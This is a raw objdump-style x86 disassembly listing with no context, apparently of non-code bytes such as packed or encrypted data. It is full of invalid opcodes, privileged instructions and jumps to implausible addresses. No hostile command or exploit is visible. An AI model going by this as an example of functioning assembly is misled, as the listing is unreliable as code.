  417d7e:	jne    0x417d25
  417d80:	mov    DWORD PTR [ebx],ebp
  417d82:	jge    0x417d13
  417d84:	xor    al,0x64
  417d86:	add    ebx,DWORD PTR [edx+ebp*4]
  417d89:	push   ecx
  417d8a:	push   edx
  417d8b:	push   ebx
  417d8c:	jp     0x417d7b
  417d8e:	mov    esi,0xe7099b4d
  417d93:	pop    eax
  417d94:	xor    esi,edx
  417d96:	int3   
  417d97:	out    dx,eax
  417d98:	sub    bh,dh
  417d9a:	adc    al,0x1c
  417d9c:	sub    al,0xcd
  417d9e:	inc    esp
  417d9f:	test   DWORD PTR [eax],ecx
  417da1:	imul   edi,esi,0x1363455
  417da7:	jmp    ebp
  417da9:	jmp    FWORD PTR [edi]
  417dab:	mov    ecx,0x4417d272
  417db0:	test   al,0x9f
  417db2:	inc    eax
  417db3:	adc    BYTE PTR [esi-0x35b262d8],0xc5
  417dba:	push   ss
  417dbb:	xchg   esi,eax
  417dbc:	or     DWORD PTR [edi-0x456f103f],ebp
  417dc2:	mov    eax,ds:0x2b84c892
  417dc7:	push   0x23
  417dc9:	sub    eax,0x4c1b5cf
  417dce:	(bad)  
  417dcf:	mov    esp,0x36d1f3d
  417dd4:	xchg   esp,eax
  417dd5:	jmp    DWORD PTR [ebp+ebx*2+0x23]
  417dd9:	in     al,0x98
  417ddb:	add    BYTE PTR [ebx+0x47fb112a],bh
  417de1:	xchg   edi,eax
  417de2:	dec    edi
  417de3:	popa   
  417de4:	pop    ecx
  417de5:	cmp    DWORD PTR [esi+0x5f],ecx
  417de8:	cmp    bl,ch
  417dea:	xchg   ecx,eax
  417deb:	adc    al,0x7d
  417ded:	stos   BYTE PTR es:[edi],al
  417dee:	loope  0x417dba
  417df0:	xchg   DWORD PTR [eax-0x75],edx
  417df3:	je     0x417d92
  417df5:	shl    BYTE PTR [esi-0x49b56ca3],cl
  417dfb:	mov    edi,0x73ef5119
  417e00:	cmp    DWORD PTR [esi-0x43b6b0a1],edx
  417e06:	xor    al,0xe7
  417e08:	imul   ebp,DWORD PTR [edi-0x1bc2b398],0xfb3b07f7
  417e12:	dec    ecx
  417e13:	lahf   
  417e14:	inc    edi
  417e15:	inc    edx
  417e16:	ret    
  417e17:	lds    edx,FWORD PTR [ebp-0x46]
  417e1a:	pop    edx
  417e1b:	ss dec eax
  417e1d:	mov    al,0x8b
  417e20:	into   
  417e21:	repnz sti 
  417e23:	sbb    bh,BYTE PTR [edi+0x68845664]
  417e29:	outs   dx,BYTE PTR ds:[esi]
  417e2a:	dec    ebx
  417e2b:	sub    edx,DWORD PTR gs:[edx]
  417e2e:	jbe    0x417e10
  417e30:	dec    edi
  417e31:	enter  0xcdde,0x53
  417e35:	cmp    esp,DWORD PTR [ebp+0x29ed8356]
  417e3b:	xor    DWORD PTR [ebx-0x1adc1945],esp
  417e41:	in     eax,0xa2
  417e43:	mov    ah,0x49
  417e45:	or     ebx,DWORD PTR [esi]
  417e47:	std    
  417e48:	pop    ss
  417e49:	dec    esi
  417e4a:	loopne 0x417e04
  417e4c:	push   cs
  417e4d:	(bad)  
  417e4e:	dec    DWORD PTR [ecx+0x49b2a455]
  417e54:	and    DWORD PTR [ecx],esp
  417e56:	xor    ch,ah
  417e58:	fld    TBYTE PTR [esi+0x1a4fa5b1]
  417e5e:	xor    edi,DWORD PTR cs:[esi+0x13]
  417e62:	hlt    
  417e63:	and    ah,BYTE PTR [esp+ecx*1-0x405a8fb]
  417e6a:	nop
  417e6b:	push   ebx
  417e6c:	paddusb mm2,QWORD PTR [esi-0x26]
  417e70:	lea    esp,[ebp-0xc14c806]
  417e76:	fdiv   DWORD PTR [ebx]
  417e78:	rol    DWORD PTR [edi],0x78
  417e7b:	outs   dx,BYTE PTR ds:[esi]
  417e7c:	pop    edi
  417e7d:	retf   
  417e7e:	jmp    0x417e94
  417e80:	frstor [ebp+0x4fb27fff]
  417e86:	mov    ch,BYTE PTR [edx-0x22]
  417e89:	pop    ebp
  417e8a:	mov    ch,0x98
  417e8c:	dec    edx
  417e8d:	pop    ebp
  417e8e:	mov    dh,0x71
  417e90:	mov    bh,0xde
  417e92:	adc    DWORD PTR [edx+0x6ee8174e],edx
  417e98:	jg     0x417e1d
  417e9a:	or     dl,bl
  417e9c:	mov    esi,0x84e32f1b
  417ea1:	or     DWORD PTR [edx],ecx
  417ea3:	cld    
  417ea4:	jae    0x417e58
  417ea6:	inc    edi
  417ea7:	out    0x2,eax
  417ea9:	gs push eax
  417eab:	add    ah,BYTE PTR [ebx]
  417ead:	cdq    
  417eae:	jge    0x417e8d
  417eb0:	inc    ebx
  417eb1:	(bad)  
  417eb2:	xchg   edx,eax
  417eb3:	shr    ah,0x61
  417eb6:	fidivr WORD PTR ds:0xfda89409
  417ebc:	test   BYTE PTR [edi],0xf8
  417ebf:	pop    edx
  417ec0:	clc    
  417ec1:	pop    ebx
  417ec2:	mov    ch,0x52
  417ec4:	fld    TBYTE PTR [edx+0x59699bfb]
  417eca:	cmc    
  417ecb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ecc:	idiv   BYTE PTR [edx+0x1]
  417ecf:	sub    eax,0x3440ccc
  417ed4:	jo     0x417eb6
  417ed6:	ds mov dx,0xde88
  417edb:	pop    ebx
  417edc:	inc    eax
  417edd:	xlat   BYTE PTR ds:[ebx]
  417ede:	or     ch,BYTE PTR [ebx+ecx*4-0x1c597035]
  417ee5:	pop    eax
  417ee6:	fdiv   DWORD PTR [edi]
  417ee8:	scas   ax,WORD PTR es:[edi]
  417eea:	mov    cl,0xbc
  417eec:	in     al,dx
  417eed:	ficom  WORD PTR [ebx+0x54]
  417ef0:	push   0x899a9cb9
  417ef5:	inc    ecx
  417ef6:	push   es
  417ef7:	jb     0x417f17
  417ef9:	(bad)  
  417efb:	retf   
  417efc:	ret    0xd980
  417eff:	lock sahf 
  417f01:	nop
  417f02:	xor    eax,0xccdcc501
  417f07:	mov    ebp,0x774fadc0
  417f0c:	stc    
  417f0d:	in     al,dx
  417f0e:	repnz or ch,dh
  417f11:	adc    esp,DWORD PTR [esi+0x61d8d0d3]
  417f17:	js     0x417ec3
  417f19:	aas    
  417f1a:	rcl    DWORD PTR [edi],0x7
  417f1d:	loopne 0x417eab
  417f1f:	and    ecx,ecx
  417f21:	xchg   ecx,eax
  417f22:	int3   
  417f23:	dec    ecx
  417f24:	aas    
  417f25:	inc    esi
  417f26:	sar    edx,0x81
  417f29:	test   BYTE PTR [eax+0x69a6593c],al
  417f2f:	xchg   esi,eax
  417f30:	adc    dl,BYTE PTR [esp+eax*2+0x4f793872]
  417f37:	xchg   BYTE PTR [edx-0x19],bl
  417f3a:	mov    esi,0xfa829460
  417f3f:	mov    dl,0x11
  417f41:	push   ebx
  417f42:	arpl   WORD PTR [ebx-0x2237ce6c],si
  417f48:	mov    eax,edi
  417f4a:	icebp  
  417f4b:	data16 xor BYTE PTR [eax],dh
  417f4e:	aam    0x23
  417f50:	sbb    eax,0x6a4980b1
  417f55:	xor    al,0x1f
  417f57:	ret    
  417f58:	lods   al,BYTE PTR ds:[esi]
  417f59:	mov    ch,0x53
  417f5b:	ret    
  417f5c:	mov    al,0xb5
  417f5e:	mov    BYTE PTR [ecx+0x28de458],bh
  417f64:	adc    bl,BYTE PTR [eax]
  417f66:	cld    
  417f67:	idiv   cl
  417f69:	mov    edx,0x7ab4da7a
  417f6e:	fist   WORD PTR ds:0x8f15577e
  417f74:	fcmovne st,st(2)
  417f76:	ret    
  417f77:	push   0x48
  417f79:	mov    ds:0x16f03bc7,al
  417f7e:	inc    esp
  417f7f:	scas   eax,DWORD PTR es:[edi]
  417f80:	cmp    DWORD PTR [eax],ecx
  417f82:	pushf  
  417f83:	sub    ebx,edi
  417f85:	dec    edx
  417f86:	and    ch,bl
  417f88:	int    0xda
  417f8a:	push   ds
  417f8b:	push   ss
  417f8c:	stos   DWORD PTR es:[edi],eax
  417f8d:	cmp    al,0xe4
  417f8f:	cmp    DWORD PTR [edi+0x67ee33cb],esp
  417f95:	int    0x2
  417f97:	dec    ebx
  417f98:	pop    ds
  417f99:	retf   0x443d
  417f9c:	jbe    0x417fae
  417f9e:	push   ds
  417f9f:	adc    bl,BYTE PTR [edi-0x41]
  417fa2:	int    0x1f
  417fa4:	push   ss
  417fa5:	pop    es
  417fa6:	push   ecx
  417fa7:	in     eax,0x57
  417fa9:	daa    
  417faa:	jp     0x418016
  417fac:	jne    0x417fbc
  417fae:	mov    al,0x79
  417fb0:	mov    eax,ds:0x73d2383f
  417fb5:	jp     0x417f55
  417fb7:	add    DWORD PTR [ebx+edx*8+0x1a82a4c1],edi
  417fbe:	add    DWORD PTR [ebp-0x7c4e7637],edx
  417fc4:	adc    BYTE PTR [eax+0x24b297c9],bl
  417fca:	loope  0x418003
  417fcc:	outs   dx,DWORD PTR ds:[esi]
  417fcd:	out    dx,al
  417fce:	xchg   bl,al
  417fd0:	pop    edi
  417fd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417fd2:	(bad)  
  417fd3:	test   eax,0xf82776a2
  417fd8:	xor    DWORD PTR [edx],ebp
  417fda:	jae    0x417f81
  417fdc:	std    
  417fdd:	call   DWORD PTR [eax+0xe]
  417fe0:	mov    edx,0x7b8bd9bb
  417fe5:	pop    esi
  417fe6:	enter  0x7c07,0xb
  417fea:	mov    WORD PTR [eax-0x33],fs
  417fed:	inc    edi
  417fef:	sahf   
  417ff0:	and    BYTE PTR ds:0xe20aeb26,ch
  417ff6:	add    DWORD PTR [ebp+0xaac32c5],esi
  417ffc:	pop    edi
  417ffd:	xchg   edx,eax
  417ffe:	lods   eax,DWORD PTR ds:[esi]
  417fff:	mov    al,0x1b
  418001:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418002:	retf   0xfa1c
  418005:	jmp    0xba1ff526
  41800a:	mov    cl,0x92
  41800c:	dec    edx
  41800d:	jl     0x418008
  41800f:	dec    edx
  418010:	dec    eax
  418011:	inc    ebx
  418012:	and    BYTE PTR [edx+eax*1],cl
  418015:	sar    DWORD PTR [edx+0x79],cl
  418018:	test   esi,eax
  41801a:	aaa    
  41801b:	jp     0x417fee
  41801d:	into   
  41801e:	popf   
  41801f:	loopne 0x41803b
  418021:	mov    dl,0x3e
  418023:	inc    edi
  418024:	jb     0x417ff3
  418026:	or     DWORD PTR [ebp-0x1a],esi
  418029:	and    ecx,ecx
  41802b:	adc    dl,BYTE PTR [edi+ebp*2-0x4a611793]
  418032:	xor    edx,DWORD PTR [esi]
  418034:	mov    cl,0xc2
  418036:	scas   eax,DWORD PTR es:[edi]
  418037:	daa    
  418038:	test   eax,0x7b8674b2
  41803d:	push   es
  41803e:	(bad)  [eax-0x3556a2b9]
  418044:	test   al,0x46
  418046:	mov    cl,0xc7
  418048:	mov    dl,dh
  41804a:	mov    bl,0x47
  41804c:	retf   
  41804d:	push   edi
  41804e:	imul   ebp,eax,0x433d3ed6
  418054:	stos   DWORD PTR es:[edi],eax
  418055:	xchg   esp,eax
  418056:	inc    ebx
  418057:	sub    al,0x9a
  418059:	test   DWORD PTR [ebp-0x6c4c306c],edi
  41805f:	sub    eax,0xe563875f
  418064:	jl     0x41802d
  418066:	fist   WORD PTR [ecx-0x7e]
  418069:	mov    bh,0xd6
  41806b:	(bad)  
  41806c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41806d:	pop    edi
  41806e:	and    al,BYTE PTR [ecx+eax*1+0x3e72dcf9]
  418075:	shl    DWORD PTR [esi],cl
  418077:	mov    eax,0x260ba158
  41807c:	mov    ebx,0xb490b430
  418081:	fisubr DWORD PTR [eax+0x1ec50eaf]
  418087:	rcl    DWORD PTR [ebx],1
  418089:	loopne 0x418015
  41808b:	sub    DWORD PTR ds:0x55dc5461,0x503de60e
  418095:	adc    DWORD PTR ds:[eax-0x5a],esp
  418099:	pop    es
  41809a:	pushf  
  41809b:	jae    0x4180a1
  41809d:	and    eax,0x699768b6
  4180a2:	add    BYTE PTR [ebx],0x6e
  4180a5:	and    al,0x46
  4180a7:	dec    edi
  4180a8:	push   cs
  4180a9:	push   cs
  4180aa:	pop    ecx
  4180ab:	(bad)  [edx+0x1047e48c]
  4180b1:	sub    BYTE PTR [edx-0x6b],bl
  4180b4:	arpl   WORD PTR [ebx],di
  4180b6:	dec    edi
  4180b7:	inc    ebp
  4180b8:	inc    eax
  4180b9:	xchg   esp,eax
  4180ba:	test   DWORD PTR [ebp+0x56],edi
  4180bd:	loop   0x418076
  4180bf:	in     eax,dx
  4180c0:	xor    BYTE PTR [edi-0xfe940b8],cl
  4180c6:	out    dx,eax
  4180c7:	lock dec edx
  4180c9:	and    BYTE PTR [ecx-0x5],cl
  4180cc:	aad    0xff
  4180ce:	and    bl,BYTE PTR [esi-0x67717a9a]
  4180d4:	aas    
  4180d5:	and    eax,0xe944238f
  4180da:	push   edx
  4180db:	xchg   BYTE PTR [ebx],bh
  4180dd:	aam    0x1f
  4180df:	cwde   
  4180e0:	inc    edi
  4180e1:	idiv   esi
  4180e3:	mov    ebp,0xd3b3deaf
  4180e8:	sub    eax,0xb29b4faa
  4180ed:	test   DWORD PTR [ecx+edi*1],esi
  4180f0:	lods   eax,DWORD PTR ds:[esi]
  4180f1:	push   cs
  4180f2:	int    0x6b
  4180f4:	(bad)
  4180f7:	adc    ebx,DWORD PTR [eax]
  4180f9:	and    ebx,DWORD PTR [edx]
  4180fb:	pop    edi
  4180fc:	into   
  4180fd:	mov    bh,0x4a
  4180ff:	ret    0xf10d
  418102:	xor    DWORD PTR [ebx-0x26],edx
  418105:	mov    ds:0x9699da24,eax
  41810a:	cs cmc 
  41810c:	nop
  41810d:	push   ebx
  41810e:	mov    cl,0x8f
  418110:	jnp    0x418155
  418112:	add    eax,0x29327856
  418117:	ins    DWORD PTR es:[edi],dx
  418118:	push   es
  418119:	mov    al,0xa4
  41811b:	push   es
  41811c:	repnz pop es
  41811e:	fiadd  DWORD PTR [ecx+ebx*1]
  418121:	fsubr  st(6),st
  418123:	popf   
  418124:	js     0x418151
  418126:	push   ebp
  418127:	pop    esi
  418128:	mov    al,ds:0xc8c4f771
  41812d:	lods   al,BYTE PTR ds:[esi]
  41812e:	or     esp,0x94bb4696
  418134:	mov    eax,ds:0x3f465a25
  418139:	adc    DWORD PTR [eax+0x3f],edx
  41813c:	bound  ebx,QWORD PTR [ebx+0x6e2cf86f]
  418142:	clc    
  418143:	jne    0x418101
  418145:	sbb    ebx,DWORD PTR [ebx+ecx*8+0x7ae93a6f]
  41814c:	test   BYTE PTR [ebx+0x473f8748],dl
  418152:	push   ebp
  418153:	sub    al,0x29
  418155:	pop    esi
  418156:	sub    DWORD PTR [edx+0x75],edi
  418159:	int3   
  41815a:	es wrmsr 
  41815d:	sub    DWORD PTR [ebx-0x3],eax
  418160:	sar    DWORD PTR [edi-0x4a],0xa6
  418164:	ins    BYTE PTR es:[edi],dx
  418165:	dec    ecx
  418166:	mov    DWORD PTR [ebp+edx*1+0x3b],esp
  41816a:	pop    esi
  41816b:	push   0x7c
  41816d:	(bad)  
  41816e:	jle    0x4181c0
  418170:	xchg   BYTE PTR [ecx-0x3],dh
  418173:	shl    BYTE PTR [esi+0x72],cl
  418176:	imul   edx,DWORD PTR [eax+0x3446f3a4],0xbfa45b51
  418180:	js     0x4181b9
  418182:	shl    DWORD PTR es:[esi],1
  418185:	adc    ch,bl
  418187:	mov    eax,ds:0x7de84e0e
  41818c:	mov    fs,WORD PTR [ebx-0x45]
  41818f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418190:	sahf   
  418191:	and    BYTE PTR [ecx],ch
  418193:	jle    0x418168
  418195:	aaa    
  418196:	test   BYTE PTR [esi],ah
  418198:	popa   
  418199:	mov    esp,DWORD PTR [eax+0x66995ebb]
  41819f:	and    al,0x52
  4181a1:	jno    0x41820b
  4181a3:	mov    esp,0x247850e
  4181a8:	xlat   BYTE PTR ds:[ebx]
  4181a9:	xor    edx,DWORD PTR [esi-0x3389a661]
  4181af:	je     0x4181a1
  4181b1:	push   ds
  4181b2:	iret   
  4181b3:	and    BYTE PTR [edi+0x16],0x51
  4181b7:	push   eax
  4181b8:	mov    bh,0x78
  4181ba:	dec    esi
  4181bb:	jmp    0x41818c
  4181bd:	aaa    
  4181be:	add    BYTE PTR [esi],0x50
  4181c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4181c2:	pop    edx
  4181c3:	xor    ecx,eax
  4181c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181c6:	repnz cmp al,BYTE PTR [esi]
  4181c9:	inc    esi
  4181ca:	mov    edi,0x37af2f02
  4181cf:	aas    
  4181d0:	jbe    0x41818a
  4181d2:	pop    es
  4181d3:	sbb    al,0x8d
  4181d5:	lahf   
  4181d6:	ins    BYTE PTR es:[edi],dx
  4181d7:	jle    0x418230
  4181d9:	push   ebx
  4181da:	mov    ecx,0x4c06d4fa
  4181df:	mov    bh,0xc4
  4181e1:	jmp    0xe2231e68
  4181e6:	xchg   BYTE PTR [eax-0x27],ch
  4181e9:	mov    dl,BYTE PTR ds:0x77955a66
  4181ef:	pop    ds
  4181f0:	mov    DWORD PTR [edx-0x67ebbb6e],esp
  4181f6:	aaa    
  4181f7:	sub    BYTE PTR [eax+0x41ac2ecd],dh
  4181fd:	push   ebp
  4181fe:	adc    eax,DWORD PTR ds:0x27cd4864
  418204:	mov    esp,0x846c78c2
  418209:	jmp    0x28e5:0x545e5487
  418210:	mov    eax,ds:0xc293f408
  418215:	ins    BYTE PTR es:[edi],dx
  418216:	lahf   
  418217:	mov    ebx,0x596fba17
  41821c:	repnz cld 
  41821e:	iret   
  41821f:	cmp    bh,BYTE PTR [eax-0x2f673a81]
  418225:	cmc    
  418226:	mov    al,ds:0xa879bc80
  41822b:	pop    ebp
  41822c:	or     BYTE PTR [edx+0x44],0x47
  418230:	sub    al,0xc5
  418232:	(bad)  
  418233:	sub    eax,0xaf32b511
  418238:	jmp    DWORD PTR [ebx-0x4a]
  41823b:	sub    BYTE PTR [edi],bh
  41823d:	dec    esp
  41823e:	(bad)  
  41823f:	xor    esi,DWORD PTR [ebx-0x198078ee]
  418245:	sbb    DWORD PTR [ebp-0x4a],ebp
  418248:	cmp    dl,cl
  41824a:	stos   DWORD PTR es:[edi],eax
  41824b:	adc    DWORD PTR [edx-0x2a54727],esi
  418251:	sbb    esi,edx
  418253:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418254:	sub    BYTE PTR [edi+0x7fc4686f],0x5c
  41825b:	sti    
  41825c:	(bad)  
  41825d:	xchg   ebx,eax
  41825e:	add    DWORD PTR [ebp+0x7a44bb15],0xffffff8f
  418265:	pop    ebx
  418266:	int3   
  418267:	jno    0x41823f
  418269:	sbb    edi,DWORD PTR [esi]
  41826b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41826c:	inc    eax
  41826d:	push   edx
  41826e:	jg     0x418275
  418270:	cwde   
  418271:	sub    eax,0x82d93194
  418276:	inc    esp
  418277:	fs sti 
  418279:	inc    edx
  41827a:	in     eax,0x5a
  41827c:	mov    DWORD PTR [esi-0x768f5097],ecx
  418282:	cdq    
  418283:	mov    edx,0x662a2f50
  418288:	test   BYTE PTR [eax+0x7b],cl
  41828b:	jl     0x418216
  41828d:	neg    DWORD PTR [ebx]
  41828f:	cwde   
  418290:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418291:	fmulp  st(4),st
  418293:	inc    eax
  418294:	shl    DWORD PTR [ecx],0xcd
  418297:	adc    al,al
  418299:	adc    bl,ah
  41829b:	dec    edx
  41829c:	and    al,0x19
  41829e:	sbb    DWORD PTR [eax+0x36],ebx
  4182a1:	rcl    eax,cl
  4182a3:	into   
  4182a4:	xchg   edx,eax
  4182a5:	sub    al,0x94
  4182a7:	fisubr DWORD PTR [ebp-0x80]
  4182aa:	cmp    ebx,edi
  4182ac:	fdiv   st(2),st
  4182ae:	mov    ebp,0xad411cb0
  4182b3:	push   es
  4182b4:	(bad)  
  4182b5:	dec    ebp
  4182b6:	xchg   bh,bh
  4182b8:	aas    
  4182b9:	cmp    BYTE PTR [esi],ch
  4182bb:	cmp    dl,al
  4182bd:	xchg   edi,eax
  4182be:	out    0x2d,eax
  4182c0:	inc    edx
  4182c1:	ret    0x1ea6
  4182c4:	add    ebp,ecx
  4182c6:	jno    0x4182ea
  4182c8:	dec    esp
  4182c9:	push   es
  4182ca:	cmp    esi,0xac807034
  4182d0:	cmp    bh,dh
  4182d2:	sti    
  4182d3:	adc    eax,0xd94dd326
  4182d8:	xchg   ebp,eax
  4182d9:	cmp    BYTE PTR [ebp-0x71],bl
  4182dc:	frstor [eiz*8+0x84c2db9]
  4182e3:	clc    
  4182e4:	daa    
  4182e5:	loope  0x41830a
  4182e7:	mov    dh,BYTE PTR [ebp+0x3e95bbcd]
  4182ed:	addr16 shl al,1
  4182f0:	jmp    0x42ed99ed
  4182f5:	and    eax,0x5e560e54
  4182fa:	stos   BYTE PTR es:[edi],al
  4182fb:	pop    ebx
  4182fc:	fs sbb al,0x62
  4182ff:	sbb    DWORD PTR [edx-0x32],eax
  418302:	cmp    cl,ah
  418304:	retf   0xcdb4
  418307:	mov    dl,0x96
  418309:	xor    al,0x36
  41830b:	push   ecx
  41830c:	cdq    
  41830d:	or     DWORD PTR [edi],0xbe244116
  418313:	xlat   BYTE PTR ds:[ebx]
  418314:	pop    esp
  418315:	js     0x4182ab
  418317:	stos   DWORD PTR es:[edi],eax
  418318:	iret   
  418319:	fcmovu st,st(0)
  41831b:	inc    ebp
  41831c:	inc    esp
  41831d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41831e:	dec    ecx
  41831f:	cmp    cl,bh
  418321:	pop    edi
  418322:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418323:	sub    eax,0x43c56292
  418328:	cwde   
  418329:	outs   dx,DWORD PTR ds:[esi]
  41832a:	mov    ds:0xaf3497d0,al
  41832f:	ror    BYTE PTR [ecx+esi*2+0x1ecc9e43],cl
  418336:	inc    ebp
  418337:	pop    ds
  418338:	mov    ah,cl
  41833a:	or     al,0x40
  41833c:	inc    ecx
  41833d:	cdq    
  41833e:	xlat   BYTE PTR ds:[ebx]
  41833f:	mov    bh,0x60
  418341:	push   ebp
  418342:	out    dx,al
  418343:	adc    al,0xe5
  418345:	push   edx
  418346:	(bad)  
  418347:	stc    
  418348:	jb     0x418338
  41834a:	mov    edx,0x7b1acf11
  41834f:	mov    WORD PTR [esi],gs
  418351:	sub    bl,BYTE PTR [eax-0x582a571a]
  418357:	inc    esi
  418358:	iret   
  418359:	jnp    0x4182ed
  41835b:	mov    ah,0x2c
  41835d:	and    al,dh
  41835f:	push   eax
  418360:	(bad)  
  418361:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418362:	adc    eax,0xfaf680db
  418367:	into   
  418368:	mov    dl,0xc6
  41836a:	inc    esp
  41836b:	ret    0x628a
  41836e:	les    esp,FWORD PTR ds:0xb015efa
  418374:	and    bh,BYTE PTR [ebx+edi*8+0x679190b9]
  41837b:	mov    esi,0x6036abd1
  418380:	add    DWORD PTR [ebx+0x2b8f3a3a],ebx
  418386:	(bad)  
  418387:	mov    dl,0x12
  418389:	ret    0x2a5
  41838c:	jae    0x418408
  41838e:	push   edx
  41838f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418390:	mov    BYTE PTR [ecx+eax*2-0x1a2699e8],dl
  418397:	dec    edi
  418398:	retf   0xdf7
  41839b:	inc    ebx
  41839c:	inc    edx
  41839d:	repz sbb BYTE PTR [ecx-0x2c11253f],ch
  4183a4:	bound  eax,QWORD PTR ds:0x15aff847
  4183aa:	icebp  
  4183ab:	out    0x7c,eax
  4183ad:	push   esi
  4183ae:	adc    bh,cl
  4183b0:	jecxz  0x418346
  4183b2:	xchg   esp,eax
  4183b3:	pusha  
  4183b4:	push   ebx
  4183b5:	pop    ds
  4183b6:	cmp    al,0xd6
  4183b8:	xor    edx,ebx
  4183ba:	cmp    esp,DWORD PTR [esi]
  4183bc:	ds ret 
  4183be:	(bad)  
  4183bf:	loop   0x418427
  4183c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4183c2:	cmp    DWORD PTR [ebp+0x372900dc],ecx
  4183c8:	cmc    
  4183c9:	mov    ds:0x24aba73f,al
  4183ce:	add    ecx,DWORD PTR [edx+eiz*4]
  4183d1:	stc    
  4183d2:	in     eax,0xcc
  4183d4:	fstp   TBYTE PTR [esp+eiz*4-0xba2ae38]
  4183db:	stc    
  4183dc:	mov    BYTE PTR [ebx+eiz*8],bh
  4183df:	loope  0x41839d
  4183e1:	xlat   BYTE PTR ds:[ebx]
  4183e2:	add    edi,DWORD PTR [ebp+eiz*4+0x69]
  4183e6:	push   ebx
  4183e7:	xchg   ebp,edx
  4183e9:	push   esi
  4183ea:	pop    esp
  4183eb:	jns    0x418387
  4183ed:	mov    esi,0xa66a957b
  4183f2:	xor    ah,BYTE PTR [eax]
  4183f4:	or     DWORD PTR [esi-0x7e],ebx
  4183f7:	or     ebx,edx
  4183f9:	bound  esp,QWORD PTR [ecx+0x16]
  4183fc:	cmp    edx,DWORD PTR [edx]
  4183fe:	xchg   edi,eax
  4183ff:	pop    ebp
  418400:	xor    ch,cl
  418402:	test   DWORD PTR [ecx+0x4cbf9388],ebx
  418408:	loope  0x41844b
  41840a:	mov    ss,WORD PTR [ecx+0x75]
  41840d:	(bad)  
  41840e:	(bad)  
  41840f:	scas   eax,DWORD PTR es:[edi]
  418410:	push   ebx
  418411:	sbb    bl,BYTE PTR ds:0xb1e098d1
  418417:	pop    ebp
  418418:	dec    edi
  418419:	shr    esp,cl
  41841b:	sub    eax,0x570ad965
  418420:	mov    ah,0x28
  418422:	outs   dx,DWORD PTR ds:[esi]
  418423:	popf   
  418424:	jle    0x4183f5
  418426:	imul   esi,DWORD PTR [ecx+0x76],0x39
  41842a:	sbb    ebx,DWORD PTR [ebx-0x2affe801]
  418430:	jnp    0x418463
  418432:	dec    edx
  418433:	or     al,0xf4
  418435:	xchg   ecx,eax
  418436:	aam    0x84
  418438:	pop    eax
  418439:	lods   eax,DWORD PTR ds:[esi]
  41843a:	adc    esp,DWORD PTR [edi-0x3ac4af9e]
  418440:	mov    edx,0x5a7408fa
  418445:	addr16 jno 0x418440
  418448:	cmc    
  418449:	xchg   edx,eax
  41844a:	and    DWORD PTR [ecx],edx
  41844c:	shl    DWORD PTR [ecx],cl
  41844e:	push   ecx
  41844f:	mov    al,ds:0x4f3ee532
  418454:	mov    al,0x9a
  418456:	sub    al,bl
  418458:	rol    DWORD PTR [edi+ecx*1+0xe],cl
  41845c:	icebp  
  41845d:	loope  0x41847b
  41845f:	or     eax,0x22271d0b
  418464:	fnstenv [eax+0xb]
  418467:	and    ecx,DWORD PTR [ecx]
  418469:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41846a:	call   0x1ae112b1
  41846f:	es (bad) 
  418471:	cwde   
  418472:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418473:	mov    BYTE PTR [ebx+0x7f],cl
  418476:	test   DWORD PTR ds:0xb5ea95b7,esp
  41847c:	inc    esi
  41847d:	cwde   
  41847e:	retf   0x265b
  418481:	pop    ecx
  418482:	fsubr  st(1),st
  418484:	mov    cl,al
  418486:	push   ecx
  418487:	cmp    al,0x65
  418489:	push   ecx
  41848a:	xor    al,0x19
  41848c:	std    
  41848d:	jne    0x418480
  41848f:	dec    eax
  418490:	pushf  
  418491:	pop    eax
  418492:	popa   
  418493:	sub    BYTE PTR [edi-0x66],al
  418496:	neg    BYTE PTR [edx]
  418498:	and    dh,BYTE PTR [edi]
  41849a:	xor    cl,BYTE PTR [esi+0x29ba5bf0]
  4184a0:	dec    esp
  4184a1:	sbb    DWORD PTR [eax],0x7c
  4184a4:	mov    edx,0xeb9d0a47
  4184a9:	fstp   TBYTE PTR [edx-0x20]
  4184ac:	xchg   esi,eax
  4184ad:	cld    
  4184ae:	or     bh,ch
  4184b0:	cmc    
  4184b1:	push   edx
  4184b2:	sub    esi,DWORD PTR [eax+0x420815d6]
  4184b8:	cdq    
  4184b9:	add    ebp,DWORD PTR [ebp-0x6a15177d]
  4184bf:	loope  0x41849b
  4184c1:	ss mov al,0x1e
  4184c4:	ficomp DWORD PTR ds:0x88853e97
  4184ca:	mov    eax,0x7394bf8f
  4184cf:	hlt    
  4184d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184d1:	leave  
  4184d2:	dec    esp
  4184d3:	and    al,0x3d
  4184d5:	(bad)  
  4184d6:	das    
  4184d7:	xor    eax,0xa8a6e87c
  4184dc:	inc    edi
  4184dd:	xchg   ebp,eax
  4184de:	mov    dh,0x7a
  4184e0:	jle    0x418474
  4184e2:	test   al,0x29
  4184e4:	fwait
  4184e5:	pop    esi
  4184e6:	lods   al,BYTE PTR ds:[esi]
  4184e7:	jne    0x41847b
  4184e9:	adc    ebp,DWORD PTR [eax+0x78c54b7b]
  4184ef:	mov    ds:0x5f2a0c60,eax
  4184f4:	call   FWORD PTR [edx-0x70464eed]
  4184fa:	ror    al,1
  4184fc:	icebp  
  4184fd:	push   edi
  4184fe:	stos   BYTE PTR es:[edi],al
  4184ff:	fst    DWORD PTR [ecx-0x3cafa258]
  418505:	in     al,dx
  418506:	jmp    0x41855f
  418508:	pop    eax
  418509:	test   eax,0x38cbbdfd
  41850e:	push   eax
  41850f:	xchg   esp,eax
  418510:	mov    fs,ebp
  418512:	and    DWORD PTR [ebp+ebp*1+0x2f2bacec],eax
  418519:	loope  0x4184a0
  41851b:	pushf  
